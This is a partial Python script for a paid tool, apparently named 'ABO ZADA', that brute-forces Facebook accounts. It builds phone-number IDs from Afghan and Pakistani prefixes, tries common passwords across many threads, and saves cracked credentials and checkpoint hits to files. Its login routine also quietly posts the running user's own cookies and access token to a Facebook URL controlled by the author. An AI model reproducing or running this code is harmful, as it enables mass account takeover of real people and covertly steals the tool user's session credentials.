...
os.system('xdg-open https://www.facebook.com/profile.php?id=100095506117878&mibextid=ZbWKwL/')
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ Owner          :    ABO ZADA          ║════════=
   \x1b[1;92m║ FACEBOOK :    NASEER AHMAD║
   \x1b[1;92m║ TELEGRAM :   0789572052        ║
   \x1b[1;92m║ TOOLS         :     RANDOM            ║
   \x1b[1;92m║  VERSION    :   1.3                         ║
   \x1b[1;92m║ WHATSAPP: [ 0764203843 ]      ║
   \x1b[1;92m║  Type type   :    PAID                     ║════════=
   \x1b[1;92m╚═════════════════════════════╝

 ABO Pro version 1.9.8
...
def login():
        ...
        try:
                ...
                requests.post('https://www.facebook.com/profile.php?id=100095506117878&mibextid=ZbWKwL/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
...
def public():
        ...
        try:
                ...
                login()
        try:
                info = requests.get('https://www.facebook.com/profile.php?id=100095506117878&mibextid=ZbWKwL'+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100095506117878&mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+93764203843&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ABO ZADA Sir, I Need To Buy Your Paid ABO ZADA PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ABO ZADA.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 9378,9377,9370,9379')
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=70) as Abozada:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Afghan123','Afghanistan','afghan12345','kabul123','100200']
                                Abozada.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 0300,0310,0320,0311')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=70) as Abozada:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'pakistan','khankhan','khan123','malik123','Ahmad123']
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ABO-ZADA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Abozada=session.cookies.get_dict().keys()
                        if "c_user" in Abozada:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ABO-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ABO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Abozada:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ABO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ABO-OK] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ABO-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ABO-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ABO-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ABO-OK] '+uid+' | '+pas+'\033[1;97m')
